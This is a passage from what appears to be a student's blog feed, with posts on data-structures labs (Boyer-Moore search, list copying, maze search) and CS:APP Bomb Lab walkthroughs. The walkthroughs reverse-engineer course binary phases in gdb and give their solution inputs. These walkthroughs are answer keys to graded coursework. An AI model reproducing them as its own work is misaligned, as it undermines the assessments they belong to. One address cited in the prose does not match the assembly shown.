dump.<br></code></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas fun7<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> fun7:<br>   0x0000000000401153 &lt;+0&gt;:sub    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000401157 &lt;+4&gt;:<span class="hljs-built_in">test</span>   %rdi,%rdi<br>   0x000000000040115a &lt;+7&gt;:je     0x401187 &lt;fun7+52&gt;<br>   0x000000000040115c &lt;+9&gt;:mov    (%rdi),%edx<br>   0x000000000040115e &lt;+11&gt;:cmp    %esi,%edx<br>   0x0000000000401160 &lt;+13&gt;:jle    0x40116f &lt;fun7+28&gt;<br>   0x0000000000401162 &lt;+15&gt;:mov    0x8(%rdi),%rdi<br>   0x0000000000401166 &lt;+19&gt;:callq  0x401153 &lt;fun7&gt;<br>   0x000000000040116b &lt;+24&gt;:add    %eax,%eax<br>   0x000000000040116d &lt;+26&gt;:jmp    0x40118c &lt;fun7+57&gt;<br>   0x000000000040116f &lt;+28&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000401174 &lt;+33&gt;:cmp    %esi,%edx<br>   0x0000000000401176 &lt;+35&gt;:je     0x40118c &lt;fun7+57&gt;<br>   0x0000000000401178 &lt;+37&gt;:mov    0x10(%rdi),%rdi<br>   0x000000000040117c &lt;+41&gt;:callq  0x401153 &lt;fun7&gt;<br>   0x0000000000401181 &lt;+46&gt;:lea    0x1(%rax,%rax,1),%eax<br>   0x0000000000401185 &lt;+50&gt;:jmp    0x40118c &lt;fun7+57&gt;<br>   0x0000000000401187 &lt;+52&gt;:mov    <span class="hljs-variable">$0xffffffff</span>,%eax<br>   0x000000000040118c &lt;+57&gt;:add    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000401190 &lt;+61&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数.<br>由节点向左为0,由节点向右为1,查找路径序的0-1列从右向左构成一个二进制数,该<br>二进制数的十进制值必须等于题目中提供的数,其为4,那么所需查找路径序列为100,<br>根据二叉树结构,应该查找7,故答案为7.</p><h3 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h3><p><img src="/2018/12/01/Bomb_lab2/ret1.png" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制炸弹 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_exp3</title>
      <link href="/2018/12/01/DS_exp3/"/>
      <url>/2018/12/01/DS_exp3/</url>
      
        <content type="html"><![CDATA[<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><a id="more"></a><p>BM算法是一种后缀匹配算法,其具有比KMP算法更优秀的性能表现.其核心思想有二<br>,第一是坏字符,坏字符就是pattern与text从右往左第一失配的在text中的字符,<br>二是好后缀,好后缀就是pattern与text从右往左连续匹配成功的子串.对于坏字符<br>和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选<br>择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词.<br>每次从文档中读取一行进行匹配搜索,每次使用BM算法搜索完成后,若搜索到单词,<br>则将主串中开始匹配的位置定为查找到单词的下一行,使用BM算法进行下一个匹配<br>搜索,直至搜索完当前行.而后循环直至匹配完整个文档.</p><h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateBC</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;<br></code></pre></td></tr></table></figure><p>传入模式串及其长度,返回根据坏字符的跳转数组.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateSuffix</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateGS</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;<br></code></pre></td></tr></table></figure></p><p>两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调<br>用第一个函数返回根据好后缀的跳转数组.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bm_search</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* text, <span class="hljs-keyword">int</span> text_len, <span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> pattern_len, <span class="hljs-keyword">int</span> *bc, <span class="hljs-keyword">int</span> *gs)</span></span>;<br></code></pre></td></tr></table></figure></p><p>传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串<br>中查找到模式串的第一个位置,未查找到,则返回-1.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">get_line</span><span class="hljs-params">(FILE *article, <span class="hljs-keyword">char</span> (&amp;text)[<span class="hljs-number">1000</span>])</span></span>;<br></code></pre></td></tr></table></figure></p><p>从给定的article文件中读取最大1000字符的一行,存在text位置,读取到文件末尾<br>则返回NULL.</p><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2018/12/01/DS_exp3/ret.png" alt="运行结果"></p><p>此为从马丁路德金的I hava a dream演讲稿中查找dream得出的结果.</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 串匹配 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_work2</title>
      <link href="/2018/11/16/DS_work2/"/>
      <url>/2018/11/16/DS_work2/</url>
      
        <content type="html"><![CDATA[<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GList_copy</span><span class="hljs-params">(GList L, GList &amp;N)</span><br></span>&#123;<br>    <span class="hljs-comment">//非空表则进入</span><br>    <span class="hljs-keyword">if</span>(L)<br>    &#123;<br>        N = <span class="hljs-keyword">new</span> GLNode;<br>        <span class="hljs-keyword">if</span>(!N) <span class="hljs-comment">//未分配空间</span><br>        &#123;<br>            <span class="hljs-built_in">exit</span>(OVERFLOW);<br>        &#125;<br>        N-&gt;tag = L-&gt;tag; <span class="hljs-comment">//复制标志位</span><br>        <span class="hljs-keyword">if</span>(L-&gt;tag==ATOM)    <span class="hljs-comment">//如果是原子</span><br>        &#123;    <br>            N-&gt;atom = L-&gt;atom;<br>        &#125;<br>        <span class="hljs-keyword">else</span>            <span class="hljs-comment">//复制表头</span><br>        &#123;<br>            GList_copy(L-&gt;hp, N-&gt;hp);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!(L-&gt;tp))    <span class="hljs-comment">//表尾为空，则递归完表</span><br>        &#123;<br>            N-&gt;tp=<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>            <span class="hljs-comment">//复制表尾</span><br>        &#123;<br>            GList_copy(L-&gt;tp, N-&gt;tp);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 广义表 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_exp2</title>
      <link href="/2018/11/10/DS_exp2/"/>
      <url>/2018/11/10/DS_exp2/</url>
      
        <content type="html"><![CDATA[<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><a id="more"></a><h4 id="图编号"><a href="#图编号" class="headerlink" title="图编号"></a>图编号</h4><p><img src="/2018/11/10/DS_exp2/graph.png" alt="图编号"><br>如图所示，从上到下，从左到右，给17个顶点进行编号，以两个顶点代表一条边，例入2-3代表可以从顶点2走到顶点3。问题即为求解从2 -&gt; 17的通路。</p><h4 id="求解思想"><a href="#求解思想" class="headerlink" title="求解思想"></a>求解思想</h4><p>求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。</p><p>求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。</p><h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><h4 id="结构体及全局变量定义"><a href="#结构体及全局变量定义" class="headerlink" title="结构体及全局变量定义"></a>结构体及全局变量定义</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p</span>    //表示顶点,用于寻找最短路径时记录路径<br>&#123;</span><br>    <span class="hljs-keyword">int</span> code;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p</span>* <span class="hljs-title">pre</span>;</span>  <span class="hljs-comment">//前一个顶点</span><br>&#125; Ver;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> edge_cnt = <span class="hljs-number">29</span>;    <span class="hljs-comment">//边的数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> ver_cnt = <span class="hljs-number">17</span>;     <span class="hljs-comment">//顶点数量</span><br><span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>[edge_cnt][<span class="hljs-number">2</span>];       <span class="hljs-comment">//记录边</span><br><span class="hljs-keyword">int</span> my_stack[MAX] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-comment">//数组模拟栈</span><br><span class="hljs-keyword">int</span> my_quque[MAX] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-comment">//数组模拟队列</span><br><span class="hljs-keyword">int</span> top = <span class="hljs-number">0</span>;                <span class="hljs-comment">//栈顶指示</span><br><span class="hljs-keyword">int</span> front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;    <span class="hljs-comment">//队列首位指示</span><br><span class="hljs-keyword">bool</span> visit[ver_cnt + <span class="hljs-number">1</span>] = &#123;<span class="hljs-literal">false</span>&#125;;  <span class="hljs-comment">//记录点是否访问过</span><br>Ver vers[ver_cnt + <span class="hljs-number">1</span>];              <span class="hljs-comment">//每个点路径链表头结点</span><br></code></pre></td></tr></table></figure><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loadmaze</span><span class="hljs-params">()</span></span>;            <span class="hljs-comment">//读入迷宫地图</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visited</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span>;        <span class="hljs-comment">//将点i状态置为访问过</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isvisited</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span>;      <span class="hljs-comment">//判断点i是否访问过</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">hasway</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span></span>;         <span class="hljs-comment">//从点s出发是否有没去过的可行路径</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find_way</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span></span>;      <span class="hljs-comment">//找到一条通路</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find_least</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span></span>;    <span class="hljs-comment">//找到一条最短路径</span><br></code></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2018/11/10/DS_exp2/ret.png" alt="运行结果"></p><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
            <tag> 迷宫问题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bomb_lab</title>
      <link href="/2018/11/09/Bomb_lab/"/>
      <url>/2018/11/09/Bomb_lab/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/deepmind210/article/details/83316486" target="_blank" rel="noopener">phase_1 - Phase_4</a><br><a id="more"></a></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disas phase_5<br></code></pre></td></tr></table></figure><p>生成下面的汇编代码，可见，需要读入一个长度为6的字符串<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0</span>x0000000000401062 <span class="hljs-variable">&lt;+0&gt;</span>:     push   %rbx<br><span class="hljs-number">0</span>x0000000000401063 <span class="hljs-variable">&lt;+1&gt;</span>:     sub    <span class="hljs-variable">$0x20</span>,%rsp<br><span class="hljs-number">0</span>x0000000000401067 <span class="hljs-variable">&lt;+5&gt;</span>:     mov    %rdi,%rbx<br><span class="hljs-number">0</span>x000000000040106a <span class="hljs-variable">&lt;+8&gt;</span>:     mov    %fs:<span class="hljs-number">0</span>x28,%rax<br><span class="hljs-number">0</span>x0000000000401073 <span class="hljs-variable">&lt;+17&gt;</span>:    mov    %rax,<span class="hljs-number">0</span>x18(%rsp)<br><span class="hljs-number">0</span>x0000000000401078 <span class="hljs-variable">&lt;+22&gt;</span>:    xor    %eax,%eax<br><span class="hljs-number">0</span>x000000000040107a <span class="hljs-variable">&lt;+24&gt;</span>:    callq  <span class="hljs-number">0</span>x40131b <span class="hljs-variable">&lt;string_length&gt;</span><br><span class="hljs-number">0</span>x000000000040107f <span class="hljs-variable">&lt;+29&gt;</span>:    cmp    <span class="hljs-variable">$0x6</span>,%eax<br><span class="hljs-number">0</span>x0000000000401082 <span class="hljs-variable">&lt;+32&gt;</span>:    je     <span class="hljs-number">0</span>x4010d2 <span class="hljs-variable">&lt;phase_5+112&gt;</span><br><span class="hljs-number">0</span>x0000000000401084 <span class="hljs-variable">&lt;+34&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span><br></code></pre></td></tr></table></figure></p><p>从下面这段，是一个循环，对输入字符串进行一个变换，得到s.其变换为是<code>s[i] = p[input[i] &amp; 0xf]</code>，p是程序内含的一个模式串.<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0x000000000040108b</span> &lt;+<span class="hljs-number">41</span>&gt;:    movzbl (%rbx,%rax,<span class="hljs-number">1</span>),%ecx<br><span class="hljs-number">0x000000000040108f</span> &lt;+<span class="hljs-number">45</span>&gt;:    mov    %cl,(%rsp)<br><span class="hljs-number">0x0000000000401092</span> &lt;+<span class="hljs-number">48</span>&gt;:    mov    (%rsp),%rdx<br><span class="hljs-number">0x0000000000401096</span> &lt;+<span class="hljs-number">52</span>&gt;:    <span class="hljs-keyword">and</span>    $0xf,%edx<br><span class="hljs-number">0x0000000000401099</span> &lt;+<span class="hljs-number">55</span>&gt;:    movzbl <span class="hljs-number">0x4024b0</span>(%rdx),%edx<br><span class="hljs-number">0x00000000004010a0</span> &lt;+<span class="hljs-number">62</span>&gt;:    mov    %dl,<span class="hljs-number">0x10</span>(%rsp,%rax,<span class="hljs-number">1</span>)<br><span class="hljs-number">0x00000000004010a4</span> &lt;+<span class="hljs-number">66</span>&gt;:    add    $0x1,%rax<br><span class="hljs-number">0x00000000004010a8</span> &lt;+<span class="hljs-number">70</span>&gt;:    cmp    $0x6,%rax<br><span class="hljs-number">0x00000000004010ac</span> &lt;+<span class="hljs-number">74</span>&gt;:    jne    <span class="hljs-number">0x40108b</span> &lt;phase_5+<span class="hljs-number">41</span>&gt;<br></code></pre></td></tr></table></figure></p><p>程序中提到了0x4024b0这个地址，由于&amp;0xf意味取取其低4位值，因为模式串长度应为16，我们查看这个串.<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">(gdb) x /<span class="hljs-number">16</span>c <span class="hljs-number">0</span>x4024b0<br><span class="hljs-number">0</span>x4024b0 &lt;<span class="hljs-keyword">array</span>.<span class="hljs-number">3449</span>&gt;:  <span class="hljs-number">109</span> <span class="hljs-string">'m'</span> <span class="hljs-number">97</span> <span class="hljs-string">'a'</span>  <span class="hljs-number">100</span> <span class="hljs-string">'d'</span> <span class="hljs-number">117</span> <span class="hljs-string">'u'</span> <span class="hljs-number">105</span> <span class="hljs-string">'i'</span> <span class="hljs-number">101</span> <span class="hljs-string">'e'</span> <span class="hljs-number">114</span> <span class="hljs-string">'r'</span> <span class="hljs-number">115</span> <span class="hljs-string">'s'</span><br><span class="hljs-number">0</span>x4024b8 &lt;<span class="hljs-keyword">array</span>.<span class="hljs-number">3449</span>+<span class="hljs-number">8</span>&gt;:        <span class="hljs-number">110</span> <span class="hljs-string">'n'</span> <span class="hljs-number">102</span> <span class="hljs-string">'f'</span> <span class="hljs-number">111</span> <span class="hljs-string">'o'</span> <span class="hljs-number">116</span> <span class="hljs-string">'t'</span> <span class="hljs-number">118</span> <span class="hljs-string">'v'</span> <span class="hljs-number">98</span> <span class="hljs-string">'b'</span>  <span class="hljs-number">121</span> <span class="hljs-string">'y'</span> <span class="hljs-number">108</span> <span class="hljs-string">'l'</span><br></code></pre></td></tr></table></figure></p><p>继续看汇编代码,发现将生成的s与另一个位于0x4025be的字符串进行比较，必须相等.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0x00000000004010b3</span> &lt;+<span class="hljs-number">81</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x40245e,%esi<br><span class="hljs-number">0x00000000004010b8</span> &lt;+<span class="hljs-number">86</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x10</span>(%rsp),%rdi<br><span class="hljs-number">0x00000000004010bd</span> &lt;+<span class="hljs-number">91</span>&gt;:    callq  <span class="hljs-number">0x401338</span> &lt;strings_not_equal&gt;<br><span class="hljs-number">0x00000000004010c2</span> &lt;+<span class="hljs-number">96</span>&gt;:    <span class="hljs-keyword">test</span>   %eax,%eax<br><span class="hljs-number">0x00000000004010c4</span> &lt;+<span class="hljs-number">98</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x4010d9</span> &lt;phase_5+<span class="hljs-number">119</span>&gt;<br><span class="hljs-number">0x00000000004010c6</span> &lt;+<span class="hljs-number">100</span>&gt;:   callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br></code></pre></td></tr></table></figure></p><p>我们查看另一个串,可指其为flyers.<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-comment">(gdb)</span> x /<span class="hljs-number">6</span>c <span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e<br><span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e:       <span class="hljs-number">102</span> <span class="hljs-string">'f'</span> <span class="hljs-number">108</span> <span class="hljs-string">'l'</span> <span class="hljs-number">121</span> <span class="hljs-string">'y'</span> <span class="hljs-number">101</span> <span class="hljs-string">'e'</span> <span class="hljs-number">114</span> <span class="hljs-string">'r'</span> <span class="hljs-number">115</span> <span class="hljs-string">'s'</span><br></code></pre></td></tr></table></figure></p><p>我们由此反解输入，例如’f’在p中下标为9，低四位1001，查表得低4位位1001的字符又’i’，依次进行，解得一组答案为”ionefg”.</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>首先还是<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-keyword">disas </span>phase_6<br></code></pre></td></tr></table></figure></p><p>从得出代码可以看出，读入了6个数字，且这6个数字互不相等.<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs undefined">Dump of assembler code <span class="hljs-keyword">for</span> function phase_6:<br><span class="hljs-number">0</span>x00000000004010f4 <span class="hljs-variable">&lt;+0&gt;</span>:     push   %r14<br><span class="hljs-number">0</span>x00000000004010f6 <span class="hljs-variable">&lt;+2&gt;</span>:     push   %r13<br><span class="hljs-number">0</span>x00000000004010f8 <span class="hljs-variable">&lt;+4&gt;</span>:     push   %r12<br><span class="hljs-number">0</span>x00000000004010fa <span class="hljs-variable">&lt;+6&gt;</span>:     push   %rbp<br><span class="hljs-number">0</span>x00000000004010fb <span class="hljs-variable">&lt;+7&gt;</span>:     push   %rbx<br><span class="hljs-number">0</span>x00000000004010fc <span class="hljs-variable">&lt;+8&gt;</span>:     sub    <span class="hljs-variable">$0x50</span>,%rsp<br><span class="hljs-number">0</span>x0000000000401100 <span class="hljs-variable">&lt;+12&gt;</span>:    mov    %rsp,%r13<br><span class="hljs-number">0</span>x0000000000401103 <span class="hljs-variable">&lt;+15&gt;</span>:    mov    %rsp,%rsi<br><span class="hljs-number">0</span>x0000000000401106 <span class="hljs-variable">&lt;+18&gt;</span>:    callq  <span class="hljs-number">0</span>x40145c <span class="hljs-variable">&lt;read_six_numbers&gt;</span><br><span class="hljs-number">0</span>x000000000040110b <span class="hljs-variable">&lt;+23&gt;</span>:    mov    %rsp,%r14<br><span class="hljs-number">0</span>x000000000040110e <span class="hljs-variable">&lt;+26&gt;</span>:    mov    <span class="hljs-variable">$0x0</span>,%r12d<br><span class="hljs-number">0</span>x0000000000401114 <span class="hljs-variable">&lt;+32&gt;</span>:    mov    %r13,%rbp<br><span class="hljs-number">0</span>x0000000000401117 <span class="hljs-variable">&lt;+35&gt;</span>:    mov    <span class="hljs-number">0</span>x0(%r13),%eax<br><span class="hljs-number">0</span>x000000000040111b <span class="hljs-variable">&lt;+39&gt;</span>:    sub    <span class="hljs-variable">$0x1</span>,%eax<br><span class="hljs-number">0</span>x000000000040111e <span class="hljs-variable">&lt;+42&gt;</span>:    cmp    <span class="hljs-variable">$0x5</span>,%eax<br><span class="hljs-number">0</span>x0000000000401121 <span class="hljs-variable">&lt;+45&gt;</span>:    jbe    <span class="hljs-number">0</span>x401128 <span class="hljs-variable">&lt;phase_6+52&gt;</span><br><span class="hljs-number">0</span>x0000000000401123 <span class="hljs-variable">&lt;+47&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span><br><span class="hljs-number">0</span>x0000000000401128 <span class="hljs-variable">&lt;+52&gt;</span>:    add    <span class="hljs-variable">$0x1</span>,%r12d<br><span class="hljs-number">0</span>x000000000040112c <span class="hljs-variable">&lt;+56&gt;</span>:    cmp    <span class="hljs-variable">$0x6</span>,%r12d<br><span class="hljs-number">0</span>x0000000000401130 <span class="hljs-variable">&lt;+60&gt;</span>:    je     <span class="hljs-number">0</span>x401153 <span class="hljs-variable">&lt;phase_6+95&gt;</span><br><span class="hljs-number">0</span>x0000000000401132 <span class="hljs-variable">&lt;+62&gt;</span>:    mov    %r12d,%ebx<br><span class="hljs-number">0</span>x0000000000401135 <span class="hljs-variable">&lt;+65&gt;</span>:    movslq %ebx,%rax<br><span class="hljs-number">0</span>x0000000000401138 <span class="hljs-variable">&lt;+68&gt;</span>:    mov    (%rsp,%rax,<span class="hljs-number">4</span>),%eax<br><span class="hljs-number">0</span>x000000000040113b <span class="hljs-variable">&lt;+71&gt;</span>:    cmp    %eax,<span class="hljs-number">0</span>x0(%rbp)<br><span class="hljs-number">0</span>x000000000040113e <span class="hljs-variable">&lt;+74&gt;</span>:    jne    <span class="hljs-number">0</span>x401145 <span class="hljs-variable">&lt;phase_6+81&gt;</span><br><span class="hljs-number">0</span>x0000000000401140 <span class="hljs-variable">&lt;+76&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span><br><span class="hljs-number">0</span>x0000000000401145 <span class="hljs-variable">&lt;+81&gt;</span>:    add    <span class="hljs-variable">$0x1</span>,%ebx<br><span class="hljs-number">0</span>x0000000000401148 <span class="hljs-variable">&lt;+84&gt;</span>:    cmp    <span class="hljs-variable">$0x5</span>,%ebx<br><span class="hljs-number">0</span>x000000000040114b <span class="hljs-variable">&lt;+87&gt;</span>:    jle    <span class="hljs-number">0</span>x401135 <span class="hljs-variable">&lt;phase_6+65&gt;</span><br><span class="hljs-number">0</span>x000000000040114d <span class="hljs-variable">&lt;+89&gt;</span>:    add    <span class="hljs-variable">$0x4</span>,%r13<br><span 